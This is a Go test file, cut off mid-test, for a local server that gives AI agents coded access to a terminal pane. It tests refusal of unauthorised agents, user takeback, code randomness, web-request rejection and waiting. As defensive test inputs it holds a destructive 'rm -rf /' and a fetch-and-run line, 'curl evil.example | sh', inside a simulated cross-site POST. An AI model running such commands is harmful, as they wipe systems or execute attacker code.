package agent

import (
	"errors"
	"fmt"
	"io"
	"net"
	"strings"
	"sync"
	"testing"
	"time"
)

// fakeWindow is a window with one pane on it, for testing what an agent
// may and may not do.
type fakeWindow struct {
	mu      sync.Mutex
	code    string
	screen  string
	typed   string
	changed uint64
	gone    bool
	taken   bool

	// lines is what the last Look was asked for, looks counts the Looks
	// by how many lines each asked for, and pressed is every key name a
	// Send has carried.
	lines   int
	looks   map[int]int
	pressed []string

	// history is what a Look of more than the screen gives back, for a
	// test about what has scrolled off. Empty means the screen.
	history string

	// bigLookFails makes a Look of more than the screen fail, which is
	// what the user taking the pane back between two looks does.
	bigLookFails bool

	// cols and rows are the size every Look reports. Zero in a test that
	// never resizes the pane, which is every reading at the same size.
	cols, rows int

	// What the pane says about the command line: whether the shell marks
	// its commands, whether one is running, how many have finished, the
	// last status, and whether the prompt the agent typed at is back.
	marks     bool
	running   bool
	done      uint64
	status    int
	hasStatus bool
	back      bool
}

// finished is a shell with marks saying a command has just finished.
func (w *fakeWindow) finished(status int) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.marks, w.running = true, false
	w.done++
	w.status, w.hasStatus = status, true
	w.changed++
}

// marking is a shell that marks its commands, with one running now.
func (w *fakeWindow) marking() {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.marks, w.running = true, true
}

// promptBack is a shell that marks nothing, whose prompt has come back.
func (w *fakeWindow) promptBack(back bool) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.back = back
	w.changed++
}

func (w *fakeWindow) Use(code string) (Pane, error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	if w.taken || code != w.code {
		return Pane{}, errors.New("that code does not name a pane this window has handed over")
	}
	return Pane{ID: "pane-1", Label: "bash", Cols: 80, Rows: 24}, nil
}

func (w *fakeWindow) Look(id string, lines int) (Look, error) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.lines = lines
	if w.looks == nil {
		w.looks = map[int]int{}
	}
	w.looks[lines]++
	if w.taken {
		return Look{}, errors.New("the user has taken that pane back")
	}
	if id != "pane-1" {
		return Look{}, errors.New("no such pane")
	}
	if lines > 0 {
		if w.bigLookFails {
			return Look{}, errors.New("that pane is no longer open")
		}
		if w.history != "" {
			return w.lookAt(w.history), nil
		}
	}
	return w.lookAt(w.screen), nil
}

// lookAt is a reading of some text, with what this window says about the
// command line on it. The lock is already held.
func (w *fakeWindow) lookAt(screen string) Look {
	return Look{
		Screen: screen, Gone: w.gone, Changed: w.changed,
		Cols: w.cols, Rows: w.rows,
		Marks: w.marks, Running: w.running, Done: w.done,
		Status: w.status, HasStatus: w.hasStatus, Back: w.back,
	}
}

func (w *fakeWindow) Send(id, text string, keys []string) error {
	w.mu.Lock()
	defer w.mu.Unlock()
	if w.taken {
		return errors.New("the user has taken that pane back")
	}
	if id != "pane-1" {
		return errors.New("no such pane")
	}
	w.typed += text
	w.pressed = append(w.pressed, keys...)
	return nil
}

func (w *fakeWindow) say(text string) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.screen = text
	w.changed++
}

// scrollback sets what a Look of more than the screen gives back, for a
// test about lines arriving while a wait is on.
func (w *fakeWindow) scrollback(text string) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.history = text
}

// sized says how big the pane is, for a reading that has to carry a
// size.
func (w *fakeWindow) sized(cols, rows int) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.cols, w.rows = cols, rows
}

// resized makes the pane a new size and rewraps what it has kept, which
// is what a pane the user drags narrower does.
func (w *fakeWindow) resized(cols, rows int, wrapped string) {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.cols, w.rows, w.history = cols, rows, wrapped
}

func (w *fakeWindow) takeBack() {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.taken = true
}

func (w *fakeWindow) sentText() string {
	w.mu.Lock()
	defer w.mu.Unlock()
	return w.typed
}

// listening starts a window listening for agents, and gives back a code
// for its one pane.
func listening(t *testing.T) (*fakeWindow, *Server, string) {
	t.Helper()
	w := &fakeWindow{screen: "$ "}
	s, err := Listen(Config{Window: w, OnError: func(error) {}})
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	t.Cleanup(func() { _ = s.Close() })

	code, err := NewCode(s.Port())
	if err != nil {
		t.Fatalf("code: %v", err)
	}
	w.code = code
	return w, s, code
}

// An agent given a code reads the pane and types into it, and nothing
// else.
func TestAnAgentReadsAndTypesInThePaneItWasGiven(t *testing.T) {
	w, _, code := listening(t)

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()

	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}
	if pane.Label != "bash" || pane.Cols != 80 {
		t.Errorf("it was handed %+v", pane)
	}

	w.say("$ whoami\r\nmarcus\r\n$ ")
	look, err := c.Read(pane.ID, 0)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if !strings.Contains(look.Screen, "marcus") {
		t.Errorf("it read %q", look.Screen)
	}

	if err := c.Send(pane.ID, "uptime\r", nil); err != nil {
		t.Fatalf("send: %v", err)
	}
	if got := w.sentText(); got != "uptime\r" {
		t.Errorf("the pane was sent %q", got)
	}
}

// Nothing reaches a pane without a code.
func TestWithoutACodeAnAgentCanDoNothing(t *testing.T) {
	w, _, code := listening(t)

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()

	// The pane is there and the agent knows its name, having guessed
	// it. Without a code that is not enough.
	if _, err := c.Read("pane-1", 0); err == nil {
		t.Error("it read a pane it was never handed")
	}
	if err := c.Send("pane-1", "rm -rf /\r", nil); err == nil {
		t.Error("it typed into a pane it was never handed")
	}
	if got := w.sentText(); got != "" {
		t.Errorf("the pane was sent %q", got)
	}
	if panes, err := c.Panes(); err != nil || len(panes) != 0 {
		t.Errorf("it holds %v, %v", panes, err)
	}
}

// A code that is not the one handed out opens nothing.
func TestAWrongCodeOpensNothing(t *testing.T) {
	_, s, _ := listening(t)

	other, err := NewCode(s.Port())
	if err != nil {
		t.Fatalf("code: %v", err)
	}
	c, err := Dial(other)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()

	if _, err := c.Use(other); err == nil {
		t.Fatal("a code nobody handed out was accepted")
	}
}

// One agent cannot reach a pane another was handed.
func TestOneAgentCannotReachAnothersPane(t *testing.T) {
	w, _, code := listening(t)

	mine, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = mine.Close() }()
	pane, err := mine.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	// A second agent on the same window, with no code of its own.
	theirs, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = theirs.Close() }()

	if _, err := theirs.Read(pane.ID, 0); err == nil {
		t.Error("it read a pane handed to somebody else")
	}
	if err := theirs.Send(pane.ID, "x", nil); err == nil {
		t.Error("it typed into a pane handed to somebody else")
	}
	if got := w.sentText(); got != "" {
		t.Errorf("the pane was sent %q", got)
	}
}

// Taking a pane back stops the agent working in it, at once.
func TestTakingAPaneBackStopsTheAgent(t *testing.T) {
	w, _, code := listening(t)

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}
	if _, err := c.Read(pane.ID, 0); err != nil {
		t.Fatalf("read: %v", err)
	}

	w.takeBack()

	if _, err := c.Read(pane.ID, 0); err == nil {
		t.Error("it read a pane the user had taken back")
	}
	if err := c.Send(pane.ID, "x", nil); err == nil {
		t.Error("it typed into a pane the user had taken back")
	}
	if got := w.sentText(); got != "" {
		t.Errorf("the pane was sent %q", got)
	}
	// And the same code does not open it again.
	if _, err := c.Use(code); err == nil {
		t.Error("the code still works")
	}
}

// Waiting comes back when the pane goes quiet.
func TestWaitingComesBackWhenThePaneGoesQuiet(t *testing.T) {
	w, _, code := listening(t)
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	// Something running, then stopping.
	done := make(chan struct{})
	go func() {
		defer close(done)
		for i := 0; i < 5; i++ {
			w.say("line " + string(rune('a'+i)))
			time.Sleep(20 * time.Millisecond)
		}
		w.say("$ ")
	}()

	look, timedOut, err := c.Wait(pane.ID, 0, Until{QuietMS: 150, TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if timedOut.GaveUp {
		t.Error("it gave up rather than seeing the pane go quiet")
	}
	if look.Screen != "$ " {
		t.Errorf("it came back on %q", look.Screen)
	}
	<-done
}

// Waiting for something that never comes gives up and says so, with
// what is on the screen.
func TestWaitingForSomethingThatNeverComesGivesUp(t *testing.T) {
	w, _, code := listening(t)
	w.say("still going")
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	look, timedOut, err := c.Wait(pane.ID, 0, Until{Contains: "never", TimeoutMS: 200})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if !timedOut.GaveUp {
		t.Error("it said it saw what it was waiting for")
	}
	if look.Screen != "still going" {
		t.Errorf("it came back with %q", look.Screen)
	}
}

// A code says which window, so two on one machine do not answer for
// each other.
func TestACodeSaysWhichWindow(t *testing.T) {
	_, one, codeOne := listening(t)
	_, two, codeTwo := listening(t)

	if one.Port() == two.Port() {
		t.Fatal("both windows took the same port")
	}
	gotOne, err := ReadCode(codeOne)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	gotTwo, err := ReadCode(codeTwo)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if gotOne != one.Port() || gotTwo != two.Port() {
		t.Errorf("the codes name %d and %d, want %d and %d",
			gotOne, gotTwo, one.Port(), two.Port())
	}

	// And one window's code does not open the other's pane.
	c, err := Dial(codeOne)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	if _, err := c.Use(codeTwo); err == nil {
		t.Error("the other window's code was accepted")
	}
}

// A code is not guessable from the ones before it.
//
// Distinct is not enough: a counter is distinct. What matters is that
// knowing a code, or a hundred of them, says nothing about the next.
func TestCodesAreNotGuessable(t *testing.T) {
	const tries = 100
	seen := map[string]bool{}
	var codes []string
	for i := 0; i < tries; i++ {
		code, err := NewCode(2222)
		if err != nil {
			t.Fatalf("code: %v", err)
		}
		if seen[code] {
			t.Fatalf("it made %q twice", code)
		}
		seen[code] = true
		// Long enough that guessing is not a way in: twenty bytes as
		// base32 is thirty-two characters.
		parts := strings.Split(code, "-")
		if len(parts) != 3 || len(parts[2]) != 32 {
			t.Fatalf("it made %q", code)
		}
		codes = append(codes, parts[2])
	}

	// Every position moves. A code made by counting leaves most of
	// itself the same from one to the next; one made from randomness
	// leaves none of it. The chance of a position holding still across
	// a hundred draws by luck is one in thirty-two to the ninety-ninth.
	for at := 0; at < 32; at++ {
		first := codes[0][at]
		same := true
		for _, code := range codes {
			if code[at] != first {
				same = false
				break
			}
		}
		if same {
			t.Errorf("character %d is %q in every code, so they are not random",
				at, string(first))
		}
	}
}

// Something pasted by mistake is turned away by name.
func TestSomethingThatIsNotACodeIsTurnedAway(t *testing.T) {
	for _, not := range []string{
		"", "hello", "gt1", "gt1-abc-xyz", "gt1-0-xyz", "gt1-99999-xyz",
		"gt2-2222-xyz", "gt1-2222-", "gt1-2222-xyz-extra",
	} {
		if _, err := ReadCode(not); err == nil {
			t.Errorf("%q was taken for a code", not)
		}
	}
	if _, err := ReadCode("gt1-2222-abcdef"); err != nil {
		t.Errorf("a code was turned away: %v", err)
	}
}

// Closing the window hangs up on every agent.
func TestClosingHangsUpOnEveryAgent(t *testing.T) {
	_, s, code := listening(t)
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	if _, err := c.Use(code); err != nil {
		t.Fatalf("use: %v", err)
	}

	if err := s.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	if _, err := c.Read("pane-1", 0); err == nil {
		t.Error("it went on working in a pane of a window that has gone")
	}
}

// Closing twice is not a failure.
func TestClosingTwiceIsFine(t *testing.T) {
	_, s, _ := listening(t)
	if err := s.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	if err := s.Close(); err != nil {
		t.Errorf("closing again gave %v", err)
	}
}

// An agent is told when the user hands a pane over and when it lets go.
func TestTheWindowIsToldWhenAnAgentComesAndGoes(t *testing.T) {
	w := &fakeWindow{screen: "$ "}
	used := make(chan string, 4)
	gone := make(chan string, 4)
	s, err := Listen(Config{
		Window:  w,
		OnError: func(error) {},
		OnUse:   func(id string) { used <- id },
		OnGone:  func(id string) { gone <- id },
	})
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer func() { _ = s.Close() }()
	code, err := NewCode(s.Port())
	if err != nil {
		t.Fatalf("code: %v", err)
	}
	w.code = code

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	if _, err := c.Use(code); err != nil {
		t.Fatalf("use: %v", err)
	}
	select {
	case id := <-used:
		if id != "pane-1" {
			t.Errorf("it was told about %q", id)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("the window was never told an agent had arrived")
	}

	if err := c.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	select {
	case id := <-gone:
		if id != "pane-1" {
			t.Errorf("it was told about %q", id)
		}
	case <-time.After(5 * time.Second):
		t.Fatal("the window was never told the agent had gone")
	}
}

// Only so many agents talk to one window at once.
//
// A wait costs a goroutine and a question of the window twenty times a
// second, and anything running as this user can open a connection.
func TestOnlySoManyAgentsAtOnce(t *testing.T) {
	_, _, code := listening(t)

	var open []*Client
	defer func() {
		for _, c := range open {
			_ = c.Close()
		}
	}()
	for i := 0; i < mostAgents; i++ {
		c, err := Dial(code)
		if err != nil {
			t.Fatalf("agent %d: %v", i, err)
		}
		// Asked something, so the connection is really established
		// rather than only queued by the system.
		if _, err := c.Use(code); err != nil {
			t.Fatalf("agent %d: %v", i, err)
		}
		open = append(open, c)
	}

	// One more is turned away. The connection may be taken by the
	// system and dropped straight after, so what says so is the first
	// question going unanswered.
	extra, err := Dial(code)
	if err != nil {
		return
	}
	defer func() { _ = extra.Close() }()
	if _, err := extra.Use(code); err == nil {
		t.Error("it took one more agent than it serves")
	}
}

// A wait gives up when the window stops listening, rather than going on
// asking a window that has gone.
func TestAWaitEndsWhenTheWindowStops(t *testing.T) {
	w, s, code := listening(t)
	w.say("still going")
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	done := make(chan struct{})
	go func() {
		defer close(done)
		_, _, _ = c.Wait(pane.ID, 0, Until{Contains: "never", TimeoutMS: 60000})
	}()

	if err := s.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}
	select {
	case <-done:
	case <-time.After(10 * time.Second):
		t.Error("the wait went on after the window stopped listening")
	}
}

// Waiting for text on the screen comes back as soon as it is there,
// without waiting for the pane to go quiet.
//
// A command that keeps printing never goes quiet, so a wait that only
// watched for quiet would sit there until the time ran out on something
// that had already happened.
func TestWaitingForTextComesBackWhileThePaneIsStillBusy(t *testing.T) {
	w, _, code := listening(t)
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	// Something that says the thing and then keeps going, so the screen
	// never settles.
	stop := make(chan struct{})
	defer close(stop)
	go func() {
		w.say("Listening on port 8080")
		for {
			select {
			case <-stop:
				return
			default:
			}
			w.say("Listening on port 8080\nstill working")
			time.Sleep(5 * time.Millisecond)
			w.say("Listening on port 8080\nstill working.")
			time.Sleep(5 * time.Millisecond)
		}
	}()

	look, timedOut, err := c.Wait(pane.ID, 0, Until{
		Contains: "Listening on port", QuietMS: 60000, TimeoutMS: 10000,
	})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if timedOut.GaveUp {
		t.Error("it waited for a busy pane to go quiet instead of for the text")
	}
	if !strings.Contains(look.Screen, "Listening on port") {
		t.Errorf("it came back on %q", look.Screen)
	}
}

// Something that is not an agent is hung up on, not talked to.
//
// A page in a browser can be made to send a chosen body to a port on
// this machine. It cannot read the answer, but it does not need to:
// typing into somebody's shell blind is enough. What it cannot choose
// is the first bytes, because a request line comes first, so a window
// that answers a line it cannot read and then reads another is a window
// a web page can type into.
func TestAWebRequestIsHungUpOnRatherThanRead(t *testing.T) {
	w, s, code := listening(t)

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", s.Port()))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = conn.Close() }()

	// What a form post from a page looks like, with the window's own
	// protocol in the body: the request line, a header, and then the
	// lines the page chose.
	body := "POST / HTTP/1.1\r\n" +
		"Host: 127.0.0.1\r\n" +
		"Content-Type: text/plain\r\n" +
		"\r\n" +
		`{"do":"use","code":"` + code + `"}` + "\r\n" +
		`{"do":"send","pane":"1","text":"curl evil.example | sh\r"}` + "\r\n"
	if _, err := io.WriteString(conn, body); err != nil {
		// The window may have hung up mid-write, which is the point.
		t.Logf("the window hung up during the write: %v", err)
	}

	// Nothing reached the shell, and the connection is closed.
	if got := w.sentText(); got != "" {
		t.Fatalf("a web request typed %q into the shell", got)
	}
	if err := conn.SetReadDeadline(time.Now().Add(5 * time.Second)); err != nil {
		t.Fatalf("deadline: %v", err)
	}
	if _, err := io.ReadAll(conn); err != nil {
		t.Fatalf("the window did not hang up: %v", err)
	}
	if got := w.sentText(); got != "" {
		t.Errorf("a web request typed %q into the shell", got)
	}
}

// And a line that stops making sense part way through ends the
// conversation rather than being answered.
func TestAConnectionThatStopsMakingSenseIsHungUpOn(t *testing.T) {
	w, s, code := listening(t)

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", s.Port()))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = conn.Close() }()

	lines := `{"do":"hello","protocol":"` + hello + `"}` + "\n" +
		"this is not a message\n" +
		`{"do":"use","code":"` + code + `"}` + "\n" +
		`{"do":"send","pane":"1","text":"whoami\r"}` + "\n"
	if _, err := io.WriteString(conn, lines); err != nil {
		t.Logf("the window hung up during the write: %v", err)
	}
	if err := conn.SetReadDeadline(time.Now().Add(5 * time.Second)); err != nil {
		t.Fatalf("deadline: %v", err)
	}
	if _, err := io.ReadAll(conn); err != nil {
		t.Fatalf("the window did not hang up: %v", err)
	}
	if got := w.sentText(); got != "" {
		t.Errorf("it went on to type %q", got)
	}
}

// A connection that says nothing is let go of rather than held.
func TestAConnectionThatSaysNothingIsLetGoOf(t *testing.T) {
	_, s, _ := listening(t)

	conn, err := net.Dial("tcp", fmt.Sprintf("127.0.0.1:%d", s.Port()))
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = conn.Close() }()

	if err := conn.SetReadDeadline(time.Now().Add(sayHelloWithin + 5*time.Second)); err != nil {
		t.Fatalf("deadline: %v", err)
	}
	if _, err := io.ReadAll(conn); err != nil {
		t.Errorf("it was still holding the connection: %v", err)
	}
}

// A window that has gone says so plainly, and says the same thing every
// time it is asked.
//
// The first question after it went used to come back with whatever the
// network last complained about, and every one after that with a raw
// socket error. An agent reads those; it deserves a sentence rather
// than a Winsock number.
func TestAWindowThatWentSaysSoEveryTime(t *testing.T) {
	_, s, code := listening(t)
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	if err := s.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	for i := 0; i < 3; i++ {
		_, err := c.Read(pane.ID, 0)
		if !errors.Is(err, ErrGone) {
			t.Errorf("ask %d gave %v", i, err)
		}
	}
	if err := c.Send(pane.ID, "x", nil); !errors.Is(err, ErrGone) {
		t.Errorf("typing gave %v", err)
	}
	if !c.Gone() {
		t.Error("it does not know the window has gone")
	}
}

// A wait watches the screen and nothing more, however many lines it was
// asked for, and reads those once at the end.
//
// A wait asks the window twenty times a second, and reading lines means
// rendering them. Asking for two thousand lines each time would make a
// wait on a busy program cost the window the whole of its scrollback,
// over and over.
func TestAWaitWatchesTheScreenAndReadsTheLinesOnce(t *testing.T) {
	w, _, code := listening(t)

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()

	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	// Something to wait through: the pane says several things and then
	// goes quiet.
	go func() {
		for i := 0; i < 5; i++ {
			w.say(fmt.Sprintf("line %d", i))
			time.Sleep(60 * time.Millisecond)
		}
	}()

	_, gaveUp, err := c.Wait(pane.ID, 2000, Until{QuietMS: 150, TimeoutMS: 10000})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if gaveUp.GaveUp {
		t.Fatal("the wait ran out of time rather than seeing the pane go quiet")
	}

	w.mu.Lock()
	defer w.mu.Unlock()
	if got := w.looks[2000]; got != 1 {
		t.Errorf("the window was asked for 2000 lines %d times, want once", got)
	}
	if got := w.looks[0]; got < 5 {
		t.Errorf("the window was asked for the screen %d times, want many", got)
	}
}

// A wait that finished and could not then read the lines it was asked
// for answers with the screen it has and says why.
//
// The waiting is over either way. A pane whose shell exited between the
// last look and the read would otherwise turn a finished wait into a
// failure, and the agent would never learn what it had been waiting for.
func TestAWaitWhoseLastReadFailsStillAnswers(t *testing.T) {
	w, _, code := listening(t)
	w.bigLookFails = true
	w.say("$ uptime\r\nup 3 days\r\n$ ")

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	look, waited, err := c.Wait(pane.ID, 500, Until{QuietMS: 20, TimeoutMS: 2000})
	if err != nil {
		t.Fatalf("the wait failed rather than answering: %v", err)
	}
	if waited.GaveUp {
		t.Error("it says the time ran out, and it did not")
	}
	if !strings.Contains(look.Screen, "up 3 days") {
		t.Errorf("it answered with %q", look.Screen)
	}
	if !strings.Contains(look.Note, "could not be read") {
		t.Errorf("it said nothing about the read that failed: %q", look.Note)
	}
}

// A wait finds what it was waiting for in the lines it reads at the end,
// even when the line went past the top of the screen while it watched.
//
// The watching sees the screen and nothing more, twenty times a second.
// A line that arrives and scrolls off between two of those looks is one
// the wait would otherwise sit out to the end of its time and then call
// a timeout, with the line it wanted in the answer it gives back.
func TestAWaitFindsWhatScrolledOffInTheLinesItReads(t *testing.T) {
	w, _, code := listening(t)
	w.say("$ ")
	// A build running, and nothing yet about how it ended.
	w.scrollback("$ make\ncompiling")

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	// The build ends while the wait is on, and the line saying so never
	// reaches the screen the wait is watching.
	go func() {
		time.Sleep(50 * time.Millisecond)
		w.scrollback("$ make\ncompiling\nBuild succeeded\n$ ")
	}()

	look, waited, err := c.Wait(pane.ID, 500, Until{Contains: "Build succeeded", TimeoutMS: 400})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if waited.GaveUp {
		t.Error("it gave up on something that happened while it was watching")
	}
	if !strings.Contains(look.Screen, "Build succeeded") {
		t.Errorf("it answered with %q", look.Screen)
	}
}

// A wait does not find what the pane was already holding when it began.
//
// The lines read at the end reach back into what scrolled off long
// before the agent asked for anything. A wait answered from those is a
// wait that says a build finished because the last one did.
func TestAWaitDoesNotFindWhatWasThereBeforeItBegan(t *testing.T) {
	w, _, code := listening(t)
	w.say("$ ")
	// The line is there from a build that finished before this wait, and
	// a second build is running now.
	w.scrollback("$ make\nBuild succeeded\n$ make\ncompiling")

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	look, waited, err := c.Wait(pane.ID, 500, Until{Contains: "Build succeeded", TimeoutMS: 300})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if !waited.GaveUp {
		t.Error("it says it saw a line that was there before it started watching")
	}
	// The lines it read still come back whole: what the pane has kept is
	// worth reading whether or not the wait was answered by it.
	if !strings.Contains(look.Screen, "Build succeeded") {
		t.Errorf("it left out what the pane has kept: %q", look.Screen)
	}
}

// A pane resized while a wait is on does not make what was already
// there look like new output.
//
// The reading taken before the wait and the one taken at the end were
// wrapped at different widths, so no line of the first is a line of the
// second. Every line then looks new, and a build that finished long
// before the agent asked would answer the wait.
func TestAWaitDoesNotTakeAResizeForNewOutput(t *testing.T) {
	w, _, code := listening(t)
	w.say("$ ")
	w.sized(40, 24)
	// The line is there from a build that finished before this wait, and
	// a second build is running now.
	w.scrollback("$ make a-very-long-target-name\nBuild succeeded\n$ make again\ncompiling")

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	// The user drags the pane narrower while the wait is on, and the long
	// command line wraps onto two rows.
	go func() {
		time.Sleep(50 * time.Millisecond)
		w.resized(20, 24,
			"$ make a-very-long-\ntarget-name\nBuild succeeded\n$ make again\ncompiling")
	}()

	look, waited, err := c.Wait(pane.ID, 500, Until{Contains: "Build succeeded", TimeoutMS: 300})
	if err != nil {
		t.Fatalf("wait: %v", err)
	}
	if !waited.GaveUp {
		t.Error("a resize made a line that was there before the wait look like new output")
	}
	if !strings.Contains(look.Screen, "Build succeeded") {
		t.Errorf("it left out what the pane has kept: %q", look.Screen)
	}
}

// A wait whose first reading fails still waits.
//
// That reading is only there to say what the pane was already holding.
// One that failed is an empty screen, which makes every line at the end
// look new, so the waiting goes on with nothing to narrow by rather than
// failing outright.
func TestAWaitWhoseFirstReadFailsStillWaits(t *testing.T) {
	w, _, code := listening(t)
	w.bigLookFails = true
	w.say("$ ")

	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	defer func() { _ = c.Close() }()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}

	// What the wait is waiting for happens while it watches.
	go func() {
		time.Sleep(50 * time.Millisecond)
		w.say("$ serve\nlistening on 8080")
	}()

	look, waited, err := c.Wait(pane.ID, 500, Until{Contains: "listening on", TimeoutMS: 2000})
	if err != nil {
		t.Fatalf("the wait failed rather than waiting: %v", err)
	}
	if waited.GaveUp {
		t.Error("it says the time ran out, and it did not")
	}
	if !strings.Contains(look.Screen, "listening on") {
		t.Errorf("it answered with %q", look.Screen)
	}
	if !strings.Contains(look.Note, "could not be read") {
		t.Errorf("it said nothing about the read that failed: %q", look.Note)
	}
}

// addedSince is the lines a later reading has that an earlier one did
// not, however far the pane scrolled in between.
func TestTheLinesAddedSinceAReadingAreTheNewOnes(t *testing.T) {
	for _, tc := range []struct {
		what, was, now, want string
	}{
		{"nothing said", "a\nb\nc", "a\nb\nc", ""},
		{"two lines more", "a\nb\nc", "a\nb\nc\nd\ne", "d\ne"},
		{"the top scrolled off", "a\nb\nc", "b\nc\nd", "d"},
		{"all of it scrolled off", "a\nb\nc", "x\ny\nz", "x\ny\nz"},
		{"the bottom row redrawn", "a\nb\n$ ", "a\nb\n$ ls\nx", "$ ls\nx"},
		// Nothing was read before, so nothing carried over and all of it
		// is new, down to a first line that is empty.
		{"no earlier reading", "", "\nBuild succeeded", "\nBuild succeeded"},
		{"no earlier reading of anything", "", "", ""},
		// The bound the doc states: the same command run twice matches a
		// longer run than really carried over, so the second run is taken
		// for the first.
		{"a block repeated exactly", "$ make\nok\n$ make\nok", "$ make\nok\n$ make\nok", ""},
		{"the screen cleared", "a\nb\nc", "\n\n$ ", "\n\n$ "},
		{"a full-screen program took over", "$ vim x\n", "  1 package main\n  2\n~",
			"  1 package main\n  2\n~"},
	} {
		if got := addedSince(tc.was, tc.now); got != tc.want {
			t.Errorf("%s: %q, want %q", tc.what, got, tc.want)
		}
	}
}

// dialled is an agent connected to a window, hung up on when the test
// ends.
func dialled(t *testing.T, code string) *Client {
	t.Helper()
	c, err := Dial(code)
	if err != nil {
		t.Fatalf("dial: %v", err)
	}
	t.Cleanup(func() { _ = c.Close() })
	return c
}

// opened is the pane a code names.
func opened(t *testing.T, c *Client, code string) Pane {
	t.Helper()
	pane, err := c.Use(code)
	if err != nil {
		t.Fatalf("use: %v", err)
	}
	return pane
}

// finish is the program in the pane ending.
func (w *fakeWindow) finish() {
	w.mu.Lock()
	defer w.mu.Unlock()
	w.gone = true
	w.changed++
}

// A wait ends when the shell says the command finished, and says that is
// why it ended.
//
// The count of finished commands is what it watches: it only moves
// forward, so a finish while the wait is on is one this wait saw.
func TestAWaitEndsWhenTheShellSaysTheCommandFinished(t *testing.T) {
	w, _, code := listening(t)
	w.marking()
	w.say("$ make")
	c := dialled(t, code)
	pane := opened(t, c, code)

	go func() {
		time.Sleep(30 * time.Millisecond)
		w.say("$ make\nbuilt\n$ ")
		w.finished(2)
	}()

	// A long quiet, so a wait that ended because the pane went quiet
	// rather than because the command finished fails here.
